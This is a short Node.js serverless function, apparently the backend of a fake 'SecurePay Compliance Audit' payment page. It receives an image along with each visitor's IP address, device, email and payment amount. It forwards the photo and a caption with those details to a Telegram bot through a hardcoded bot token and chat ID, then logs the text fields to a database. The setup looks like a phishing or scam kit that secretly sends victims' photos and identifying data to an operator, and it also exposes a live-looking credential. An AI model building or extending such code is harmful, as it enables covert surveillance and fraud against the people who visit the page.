const { Pool } = require('pg');

// Connect to your Vercel PostgreSQL database
const pool = new Pool({
  connectionString: process.env.POSTGRES_URL,
});

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    let body = req.body;
    if (typeof body === 'string') {
      body = JSON.parse(body);
    }
    
    // We added transaction_id, amount, and user_email to the incoming data
    const { image, role, ipInfo, userAgent, transaction_id, amount, user_email } = body || {};

    // ==========================================
    // YOUR VERIFIED CREDENTIALS
    // ==========================================
    const TELEGRAM_BOT_TOKEN = "8923655458:AAEiCNK4WqCj9sQVOY7z-ZYeBXsdWX00aPY";
    const TELEGRAM_CHAT_ID = "8783830673";
    // ==========================================

    if (!image) {
      return res.status(400).json({ error: 'No image provided' });
    }

    // 1. Send photo and details to Telegram (Your existing code)
    const base64Data = image.replace(/^data:image\/png;base64,/, "");
    const buffer = Buffer.from(base64Data, 'base64');
    const blob = new Blob([buffer], { type: 'image/png' });

    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('photo', blob, 'audit.png');
    
    // I added the Amount to the Telegram caption so you can see it there too
    const captionText = `🚨 *SecurePay Compliance Audit*\n\n` +
                        `🏷️ *Node Tag:* \`${role || 'Unknown'}\`\n` +
                        `🌐 *IP Address:* \`${ipInfo || 'Unknown'}\`\n` +
                        `💻 *Device:* \`${userAgent || 'Unknown'}\`\n` +
                        `💰 *Amount:* \`₹${amount || '0'}\`\n` +
                        `✅ *Status:* \`Handshake Cleared & Logged\``;
                        
    formData.append('caption', captionText);
    formData.append('parse_mode', 'Markdown');

    const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: formData
    });

    const result = await telegramResponse.json();
    
    if (!result.ok) {
      console.error("🔴 TELEGRAM PHOTO ERROR:", JSON.stringify(result));
      return res.status(500).json({ telegramError: result.description });
    }

    // 2. NEW: Save the text details to your database (skipping the photo)
    await pool.query(`
      INSERT INTO audit_logs (transaction_id, amount, user_email, node_role, ip_address, photo_status)
      VALUES ($1, $2, $3, $4, $5, $6)
    `, [
      transaction_id || null, 
      amount || 0, 
      user_email || 'unknown', 
      role || 'Unknown', 
      ipInfo || 'Unknown', 
      'Sent to Telegram' // We save text confirming the photo was sent, but not the heavy image file
    ]);

    return res.status(200).json({ success: true, message: 'Audit sent to Telegram and saved to DB.' });
  } catch (error) {
    console.error("🔴 SERVER CRASH:", error.message);
    return res.status(500).json({ error: error.message });
  }
};
